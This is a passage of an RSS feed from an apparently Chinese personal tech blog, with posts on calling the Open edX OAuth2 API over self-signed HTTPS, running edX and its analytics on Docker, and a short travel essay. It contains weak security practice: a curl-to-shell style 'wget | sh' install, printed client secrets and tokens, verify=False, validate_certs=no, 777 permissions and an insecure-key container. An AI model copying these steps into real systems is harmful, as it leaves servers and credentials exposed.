 u&amp;#39;year_of_birth&amp;#39;: None}
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;下边演示请求Access Token的过程&lt;/h3&gt;
&lt;p&gt;使用&lt;code&gt;requests&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests.auth&lt;/span&gt;
&lt;span class="n"&gt;client_auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPBasicAuth&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dc107056a5335b3a7c74&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4e3f1fad6e0583fc80d78541f2ca6cfad8a93bed&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;post_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grant_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwjtest&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://127.0.0.1/oauth2/access_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;client_auth&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;post_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;得到&lt;code&gt;{u'error': u'invalid_request',
 u'error_description': u'A secure connection is required.'}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;网站需要使用https，nmap查看443端口是close状态。&lt;/p&gt;
&lt;p&gt;配置nginx。&lt;/p&gt;
&lt;h2&gt;启用https&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Remember that you should always use HTTPS for all your OAuth 2 requests otherwise you won’t be secured.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;OAuth2要求使用https。所以我们为edx做https支持&lt;/p&gt;
&lt;h3&gt;生成证书&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd /edx/app/nginx/
mkdir conf
chown -R 777 conf #好像不大好
cd conf
#创建服务器私钥，命令会让你输入一个口令
openssl genrsa -des3 -out server.key 1024
#创建签名请求的证书（CSR）
openssl req -new -key server.key -out server.csr
#在加载SSL支持的Nginx并使用上述私钥时除去必须的口令：
cp server.key server.key.org
openssl rsa -in server.key.org -out server.key
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;配置nginx&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;/edx/app/nginx/sites-enabled&lt;/code&gt;里，将lms复制为lms_https&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo diff lms lms_https
1,3c1
&amp;lt; upstream lms-backend {
&amp;lt;             server 127.0.0.1:8000 fail_timeout=0;
&amp;lt;     }server {
---
&amp;gt; server {
12,13c10,13
&amp;lt;
&amp;lt;     listen 80 default;
---
&amp;gt;     listen 443;
&amp;gt;     ssl on;
&amp;gt;     ssl_certificate /edx/app/nginx/conf/server.crt;
&amp;gt;     ssl_certificate_key /edx/app/nginx/conf/server.key;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在&lt;code&gt;/edx/app/nginx/sites-enabled/lms&lt;/code&gt;的server结尾里加上&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  # Forward to HTTPS if we&amp;#39;re an HTTP request...
  if ($http_x_forwarded_proto = &amp;quot;http&amp;quot;) {
    set $do_redirect &amp;quot;true&amp;quot;;
  }

  # Run our actual redirect...
  if ($do_redirect = &amp;quot;true&amp;quot;) {
    rewrite ^ https://$host$request_uri? permanent;
  }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;重启nginx，https方面的设置就好了，你可以访问，https://example.com 啦&lt;/p&gt;
&lt;h2&gt;https下请求Access Token&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests.auth&lt;/span&gt;
&lt;span class="n"&gt;client_auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPBasicAuth&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dc107056a5335b3a7c74&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4e3f1fad6e0583fc80d78541f2ca6cfad8a93bed&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;post_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grant_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwjtest&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://127.0.0.1/oauth2/access_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;client_auth&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;post_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;``&lt;/p&gt;
&lt;p&gt;ok&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{u&amp;#39;access_token&amp;#39;: u&amp;#39;e751c317435986b2a00425ed7a93a789fbcbeccd&amp;#39;,
 u&amp;#39;expires_in&amp;#39;: 2591999,
 u&amp;#39;scope&amp;#39;: u&amp;#39;&amp;#39;,
 u&amp;#39;token_type&amp;#39;: u&amp;#39;Bearer&amp;#39;}
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;微信后端&lt;/h1&gt;
&lt;p&gt;暂不方便公开源码&lt;/p&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;将mobile api相关的请求全部redirect倒https&lt;/li&gt;
&lt;li&gt;https证书相关&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;2015.07.15更新&lt;/h1&gt;
&lt;p&gt;开发群里有小伙伴提到在用android客户端去访问服务器时，会出现这样的错误。javax.net.ssl.SSLPeerUnverifiedException: No peer certificate
(文后评论中也有人提到)&lt;/p&gt;
&lt;p&gt;这是ssl证书的问题，我此前的做法是不验证。这只是绕过了问题，而没有解决它，在此正面解决它，分以下步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;申请ssl证书，我用的是免费的startssl。可参考&lt;a href="http://www.startssl.com/?app=42"&gt;www.startssl.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;将申请来的证书加入到lms_https里:  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssl on;
ssl_certificate /etc/nginx/conf/your-ssl-unified.crt;
ssl_certificate_key /etc/nginx/conf/your-ssl.key;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;sudo killall -HUP nginx&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;2015.09.23更新&lt;/h1&gt;
&lt;p&gt;Cypress中的&lt;code&gt;/edx/app/nginx&lt;/code&gt;目录有微调，移除了&lt;code&gt;/edx/app/nginx/sites-enabled&lt;/code&gt;,所以我们需要把&lt;code&gt;/edx/app/nginx/sites-available/&lt;/code&gt;中新建的文件软链接到&lt;code&gt;/etc/nginx/sites-enabled/&lt;/code&gt;里&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 30 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-30:edx-api.html</guid><category>edx</category></item><item><title>最难追的女生</title><link>/pursue-a-girl.html</link><description>&lt;p&gt;南京大雨，北上途中，窗外茫茫一片&lt;/p&gt;
&lt;p&gt;车速很快，雨水打在窗上，向外望去，如隔毛玻璃。山水只剩轮廓，水墨一般，煞是好看，&lt;/p&gt;
&lt;p&gt;路过滁州，沿途绿得深浅不一&lt;/p&gt;
&lt;p&gt;“环滁皆山也” 真是干净漂亮的开头。专门搜到欧阳修的那篇名作，再读，内容却也并无太出彩之处。&lt;/p&gt;
&lt;p&gt;再往北雨就小了，再往北索性就停了&lt;/p&gt;
&lt;p&gt;车上无聊，同好久没联系的朋友在微信上闲聊，聊到他离职创业，人前光彩，个中辛酸，也都意料之中，无甚趣味，又聊到他最近正在追的女生。我倒是兴趣盎然，将闲扯中有趣部分单独摘出，做个记录&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;最难追的女生是那些没谈过恋爱的女生。&lt;/p&gt;
&lt;p&gt;对于经历了若干段恋情的女生，你比她ex帅气，用心，善良，如果还风趣幽默，也许她就试着和你交往了。&lt;/p&gt;
&lt;p&gt;而对于前者，你的对手可能是贾宝玉，杨过，渡边彻，岩井俊二，都敏俊，Jon Snow，孙悟空，不一而足&lt;/p&gt;
&lt;p&gt;所有她幻想中的，现实中的，言情中的，武侠中的&lt;/p&gt;
&lt;p&gt;你所面对的，其实是一个理想主义者&lt;/p&gt;
&lt;p&gt;而世上还有什么比驯服一个理想主义者更难的事呢&lt;/p&gt;
&lt;p&gt;如果真有，大约是驯服一个当上项目经理的理想主义者&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 27 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-27:pursue-a-girl.html</guid><category>随笔</category></item><item><title>基于docker的edx数据分析</title><link>/edx-data-analysis-on-docker.html</link><description>&lt;p&gt;此前写过这篇：&lt;a href="http://wwj718.github.io/edx-insight.html"&gt;edx中数据可视化相关&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;edx的数据/行为分析和可视化这一块我觊觎很久了。一直以来进展不大，这一块的依赖关系和数据流我此前一直没大理清。&lt;/p&gt;
&lt;p&gt;这段时间又重新认真地看了一遍这一块的架构/数据流和依赖关系，茅塞顿开，一经试验，居然成功了。其实文档中的这幅图说的很清晰了&lt;/p&gt;
&lt;p&gt;&lt;img alt="Analytics_AWS_Deployment" src="img/edx/docker/Analytics_AWS_Deployment.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;目前的做法，斯坦福还是edx官方，似乎都将数据分析的工作跑在amazon上&lt;/p&gt;
&lt;p&gt;国内的情况你懂的,依赖于国外的服务会很蛋疼，所以我想让数据分析的模块跑在docker上，像插件一样，随时可插拔。在理清了依赖关系后，发现数据分析的模块，与外部只有input和output的依赖（也本该如此^_^），前者是track log，后者存入mysql。那么问题就简单多啦，只要在docker里配置好环境和依赖。一试之下居然成功了。先上效果&lt;/p&gt;
&lt;p&gt;&lt;img alt="hadoop1.jpeg" src="img/edx/docker/hadoop1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="hadoop2.jpeg" src="img/edx/docker/hadoop2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;目前可用的task有&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{AnswerDistributionOneFilePerCourseTask,AnswerDistributionPerCourse,AnswerDistributionToMySQLTaskWorkflow,AnswerDistributionWorkflow,BaseAnswerDistributionTask,BaseHadoopJobTask,CalendarTableTask,CalendarTask,CompositionTask,CourseActivityDailyTask,CourseActivityMonthlyTask,CourseActivityTask,CourseActivityWeeklyTask,CourseEnrollmentChangesPerDay,CourseEnrollmentEventsPerDay,CourseEnrollmentTableTask,CourseEnrollmentTask,CourseEnrollmentValidationPerDateTask,CourseEnrollmentValidationTask,CreateAllEnrollmentValidationEventsTask,CreateEnrollmentValidationEventsForTodayTask,CreateEnrollmentValidationEventsTask,DailyRegistrationsEnrollmentsAndCourses,EnrollmentByBirthYearTask,EnrollmentByEducationLevelTask,EnrollmentByGenderTask,EnrollmentByModeTask,EnrollmentDailyTask,EnrollmentTask,EnrollmentValidationWorkflow,EnrollmentsByWeek,EnrollmentsandRegistrationsWorkflow,EnvironmentParamsContainer,EventExportTask,EventLogSelectionTask,GradeDistFromSqoopToMySQLWorkflow,GradeDistFromSqoopToTSVWorkflow,HistogramFromSqoopToMySQLWorkflowBase,HistogramFromStudentModuleSqoopWorkflowBase,HiveQueryTask,HiveQueryToMysqlTask,HiveTableFromQueryTask,HiveTableTask,ImportAllDatabaseTablesTask,ImportAuthUserProfileTask,ImportAuthUserTask,ImportEnrollmentsIntoMysql,ImportIntoHiveTableTask,ImportLastCountryOfUserToHiveTask,ImportMysqlToHiveTableTask,ImportStudentCourseEnrollmentTask,InsertToMysqlAnswerDistributionTableBase,InsertToMysqlCourseEnrollByCountryTask,InsertToMysqlCourseEnrollByCountryTaskBase,InsertToMysqlCourseEnrollByCountryWorkflow,InsertToMysqlLastCountryOfUserTask,JobTask,LastCountryForEachUser,LastCountryOfUser,LastProblemCheckEvent,MapReduceJobTask,MultiOutputMapReduceJobTask,MysqlInsertTask,MysqlSelectTask,ParseEventLogPerformanceTask,PathSetTask,QueryLastCountryPerCourseTask,QueryLastCountryPerCourseWorkflow,SeqOpenDistFromSqoopToMySQLWorkflow,SeqOpenDistFromSqoopToTSVWorkflow,SqoopImportFromMysql,SqoopImportTask,StudentModulePerCourseAfterImportWorkflow,StudentModulePerCourseTask,Task,TotalEventsDailyTask,TotalEventsReport,TotalEventsReportWorkflow,URLManifestTask,UserActivityTableTask,UserActivityTask,UserRegistrationsPerDay,UsersPerCountry,UsersPerCountryReport,UsersPerCountryReportWorkflow,WeeklyAllUsersAndEnrollments,WeeklyIncrementalUsersAndEnrollments,WrapperTask}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;更多细节可以参考&lt;a href="https://github.com/edx/edx-analytics-pipeline/wiki/Tasks-to-Run-to-Update-Insights"&gt;Tasks-to-Run-to-Update-Insights&lt;/a&gt;，以及&lt;a href="https://github.com/edx/edx-analytics-pipeline/wiki/Stanford-analytics-task-scheduler"&gt;Stanford analytics task scheduler&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;接下来的工作就是将分析出来的结果呈现到insights里，那么数据可视化的的工作就完成了。insights是个独立的server，分析结果存在result store(mysql)中&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 26 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-26:edx-data-analysis-on-docker.html</guid><category>edx</category></item><item><title>基于docker容器的edx分布式</title><link>/edx-birch-distributed-on-docker.html</link><description>&lt;p&gt;将edx组件分离到多个docker container的实验，build成功，可正常使用。&lt;/p&gt;
&lt;p&gt;目前分离的组件包括:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;edxapp   &lt;/li&gt;
&lt;li&gt;mysql&lt;/li&gt;
&lt;li&gt;mongodb&lt;/li&gt;
&lt;li&gt;forum&lt;/li&gt;
&lt;li&gt;elasticsearch&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;build成功后的images分布&lt;/p&gt;
&lt;p&gt;&lt;img alt="images" src="img/edx/docker/images.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;sudo docker ps 如下&lt;/p&gt;
&lt;p&gt;&lt;img alt="docker_ps" src="img/edx/docker/docker_ps.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;每个组件在一个单独的docker container里，如果需要采取分布式，只需要将组件分发到不同的机器上，在这些机器上将容器跑起来，而后在edxapp容器里将其他容器link进来就可以了。&lt;/p&gt;
&lt;p&gt;建议将mongo和mysql的数据挂载到宿主机上（出于安全考虑）&lt;/p&gt;
&lt;p&gt;之后有时间给出build的过程&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 24 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-24:edx-birch-distributed-on-docker.html</guid><category>edx</category></item><item><title>edx(birch) on docker</title><link>/edx-birch-on-docker.html</link><description>&lt;p&gt;上一篇文章提到我build出了edx（birch）的docker版。&lt;/p&gt;
&lt;p&gt;此前appsembler（国外提供edx服务的一家公司）在docker hub上发布过edx-lite和edx-full，不过一直停留在aspen版本。而birch版本修复了不少重大bug，并加入了分组之类的实用特性，我几个月前写邮件问他们是否有发布birch版本的打算，他们回复说：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We do already have some birch images that we use for our clients, but those are currently only for internal use as they contain our API keys and other private stuff. I think we plan on releasing the birch images publicly at some point, but I can’t tell you when exactly as we have more urgent work to do at the moment.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;回信的末尾说发布出来后会通知我，我也等不及了，就自己去build了。&lt;/p&gt;
&lt;p&gt;在此记录build的过程&lt;/p&gt;
&lt;h1&gt;环境&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Ubuntu14.04&lt;/li&gt;
&lt;li&gt;docker1.7&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;安装最新版docker&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;wget -qO- https://get.docker.com/ | sh&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;开始安装&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#base image
sudo docker pull phusion/baseimage
git clone https://github.com/appsembler/configuration.git -b docker_release ~/configuration
sudo docker run -i -t -p :80 -p :18010 -p :18020 -d -v ~/configuration:/configuration phusion/baseimage /sbin/my_init --enable-insecure-key
sudo docker ps #获取&amp;lt;container_id&amp;gt;

#进入到容器里开始安装，此后的过程和在ubuntu12.04上部署相似
sudo docker exec -it &amp;lt;container_id&amp;gt; bash

#处理elasticsearch相关的两个问题
1.vim playbooks/roles/elasticsearch/tasks/main.yml
     force=no
+    validate_certs=no
   register: elasticsearch_reinstall

2.vim playbooks/roles/elasticsearch/tasks/main.yml
+- name: Disable dynamic scripting
+  lineinfile: &amp;quot;dest=/etc/elasticsearch/elasticsearch.yml line=&amp;#39;script.disable_dynamic: true&amp;#39;&amp;quot;
+  sudo: True
+  when: not ELASTICSEARCH_CLUSTERED

 - name: create directories
   file: &amp;gt;

#安装依赖
apt-get update &amp;amp;&amp;amp; apt-get install -y python-dev python-setuptools python-apt gcc &amp;amp;&amp;amp; easy_install pip
cd /configuration &amp;amp;&amp;amp; pip install -r requirements.txt

#安装edx-lite，里边只跑着cms，lms和forum
cd playbooks &amp;amp;&amp;amp; ansible-playbook -vv -c local -i &amp;quot;127.0.0.1,&amp;quot; docker_lite.yml  #中途失败后可以用 --start-at-task=&amp;quot;xx&amp;quot;继续

#成功后，记得commit,移除&amp;quot;/sbin/my_init&amp;quot;,
docker commit -a &amp;quot;wwj718&amp;lt;wuwenjie718@gmail.com&amp;gt;&amp;quot; -run &amp;#39;{&amp;quot;Cmd&amp;quot;:[&amp;quot;--enable-insecure-key&amp;quot;], &amp;quot;PortSpecs&amp;quot;:[&amp;quot;22&amp;quot;,&amp;quot;80&amp;quot;,&amp;quot;5000&amp;quot;, &amp;quot;18010&amp;quot;, &amp;quot;18020&amp;quot;]}&amp;#39; &amp;lt;container_id&amp;gt; wwj718/edx-lite:birch

#push到docker hub
docker push wwj718/edx-lite:birch

#导出(export)
sudo docker export &amp;lt;container_id&amp;gt; &amp;gt; edx-lite_birch_export.tar

#也可以这样导出(save)
sudo docker save wwj718/edx-lite:birch &amp;gt; edx-lite_birch_save.tar
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;关于docker中export和save的区别,stackoverflow上的&lt;a href="http://stackoverflow.com/questions/22655867/what-is-the-difference-between-save-and-export-in-docker"&gt;这个回答&lt;/a&gt;说的很好：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The exported image will not have any layer or history information saved, so it will be smaller and you will not be able to rollback&lt;/p&gt;
&lt;/blockquote&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 24 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-24:edx-birch-on-docker.html</guid><category>edx</category></item><item><title>edx推广，国内社区与docker</title><link>/edx-popularize-community-docker.html</link><description>&lt;blockquote&gt;
&lt;p&gt;当开始建设社区的时候，你需要拿出一个像样的承诺。程序此时并不需要特别好，它可以简陋、有错、不完整，文档可以少得可怜。但它至少要做到：(a)能运行，(b)让潜在的合作开发者相信，这个软件在可预见的未来，能演变成一个非常棒的东西          --《大教堂与集市》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;目前edx的复杂度很大程度影响了它在国内的使用和推广。&lt;/p&gt;
&lt;p&gt;我平时收到的国内折腾edX的团队发来的邮件中，大多都对此存在抱怨。&lt;/p&gt;
&lt;p&gt;国内开发者聚集之处，每天翻来覆去的谈论的，也都是安装啦部署啦协作啦代码管理啦这些问题，的确每一个问题都让人头疼。而每一个入门者，在最初阶段又都得面对它们。&lt;/p&gt;
&lt;p&gt;这道烦人的门槛并不低。&lt;/p&gt;
&lt;p&gt;上上周，去北京讨论了一下关于组织国内开发者会议的事。（初步定在暑期）&lt;/p&gt;
&lt;p&gt;同@MT聊到建立国内社区的可能性，以及社区一旦形成，致力于去解决哪些问题，本土化自然是核心，这里指广义的本土化，而不仅仅是汉化这种初步的，我们希望通过开发者会议（会邀请教育界的人士），收集国内用户都有哪些需求和痛点，然后将其作为之后社区努力的方向之一&lt;/p&gt;
&lt;p&gt;目前已在&lt;a href="https://github.com/edx/edx-platform"&gt;edx-platform&lt;/a&gt;的wiki里列出了中国区Open edX使用者及开发者关注的一些问题，并整理开发相关中文资源：&lt;a href="https://github.com/edx/edx-platform/wiki/localization-and-development-in-china"&gt;localization and development in china&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;edx的复杂度，开发者们有目共睹。我相信docker是推广edx和驯服这些复杂度的利器。&lt;/p&gt;
&lt;p&gt;我最近在使用docker做实验，目前已经build出了birch版本，已提交到docker hub，完善后（汉化，自适应主题，可用性优化等），准备发布出来。接下来将尝试基于docker的多容器以及分布式，此后将尝试使用docker容器做数据分析，而不打算采用amazon。&lt;/p&gt;
&lt;p&gt;也建议采用docker来构建社区维护的基础版 ：）&lt;/p&gt;
&lt;p&gt;我相信用docker折腾edx能简化以下问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开发：使用docker将获得以下好处&lt;ul&gt;
&lt;li&gt;轻量化，docker比virtualbox要节约内存得多，跑edx的速度也快得多&lt;/li&gt;
&lt;li&gt;协作变得容易，团队成员之间的协作开发模式，变得与git相似，环境和开发成果的同步变得容易&lt;/li&gt;
&lt;li&gt;开发成果很容易直接部署到生产环境，几乎就是一键式的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;部署：部署变得一键式，docker pull下来就可以run了。甚至可以据此可以构建云平台，提供云服务&lt;/li&gt;
&lt;li&gt;社区构建：有一个可用的版本可以被社区环绕&lt;/li&gt;
&lt;li&gt;升级：集中化管理。将复杂度转移给社区，只要针对一个image进行升级，社区成员可以共享成果，各自去pull新版本就行。需要单独处理的，只有自己的数据，大大降低了升级难度。一些烦人的问题，诸如国外网络之类的，只需要被解决一次就行&lt;/li&gt;
&lt;li&gt;insights ：分析平台成为单独的组件，封装在docker中,只对外暴露出接口（端口）&lt;/li&gt;
&lt;li&gt;分布式：采用多容器部署，分离出数据库之类的组件，之后这些组件可以轻易地分布到不同机器上&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 24 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-24:edx-popularize-community-docker.html</guid><category>edx</category></item><item><title>edX开发相关</title><link>/edx-development.html</link><description>&lt;blockquote&gt;
&lt;p&gt;如果纠错是消除软件bug的过程，那编程一定是把它们放进去的过程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近收到几封邮件，来自国内的几个edX团队，问些edX开发相关的问题，问题大同小异，一并列到博客上，下回开发者中再有人问。我就把链接一甩,然后在沙发上继续翘着二郎腿看《冰与火之歌》&lt;/p&gt;
&lt;p&gt;本文将谈论几个方面的问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开发环境&lt;/li&gt;
&lt;li&gt;IDE&lt;/li&gt;
&lt;li&gt;代码管理&lt;/li&gt;
&lt;li&gt;部署到生产环境&lt;/li&gt;
&lt;li&gt;协同开发&lt;/li&gt;
&lt;li&gt;测试&lt;/li&gt;
&lt;li&gt;我常用的工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;开发环境&lt;/h2&gt;
&lt;p&gt;理论上可以在任何系统下开发，Linux/Mac/Windows都行。无论你在哪个系统下开发，你都应该熟悉linux（Ubuntu）。edX的开发者版本实际是个虚拟机，跑在Virtualbox里的Ubuntu12.04，采用Vagrant管理。&lt;/p&gt;
&lt;p&gt;所以只要你的机器装有Vagrant和Virtualbox，无论Linux/Mac/Windows，你都可以开发edX&lt;/p&gt;
&lt;p&gt;无论你在哪个系统下开发，大多时间你都在和Ubuntu打交道，更多细节可以参考&lt;a href="https://github.com/edx/configuration/wiki/edX-Developer-Stack"&gt;edX-Developer-Stack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;开发环境的搭建参考官方wiki就好，在此不赘述，参考这边：&lt;a href="https://github.com/edx/configuration/wiki/edX-Developer-Stack#installing-the-edx-developer-stack"&gt;installing-the-edx-developer-stack&lt;/a&gt;&lt;/p&gt;
